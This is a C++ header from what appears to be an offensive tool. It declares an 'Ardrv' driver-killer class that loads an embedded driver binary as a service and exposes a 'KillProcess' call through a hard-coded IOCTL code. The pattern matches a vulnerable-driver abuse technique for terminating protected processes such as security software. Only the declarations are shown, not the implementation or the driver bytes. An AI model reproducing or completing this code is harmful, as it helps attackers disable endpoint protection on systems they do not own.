#pragma once
#include <windows.h>
#include <string>
#include "DriverService.hpp"
#include "Singleton.hpp"
#include "ObjectProxy.hpp"
#include "DriverKiller.hpp"
#include "ArdrvBin.hpp"

class Ardrv final :
	public DriverKiller<Ardrv>,
	public Singleton<Ardrv>
{
	friend class Singleton<Ardrv>;

private:
	static constexpr ULONG IOCTL_KILL_PROCESS = 0x2420031u;

public:
	explicit Ardrv(Token) noexcept : Ardrv()
	{
	}
	~Ardrv() = default;

	BOOLEAN InitKiller() noexcept
	{
		return Initialize(ArdrvBin::hexData,
						  ArdrvBin::hexSize,
						  ArdrvBin::service,
						  ArdrvBin::serviceSize,
						  ArdrvBin::Key);
	}


	BOOLEAN
		KillProcess(ULONG Pid);

private:
	Ardrv() = default;
};



inline constexpr ObjectProxy<Ardrv> g_Ardrv{};

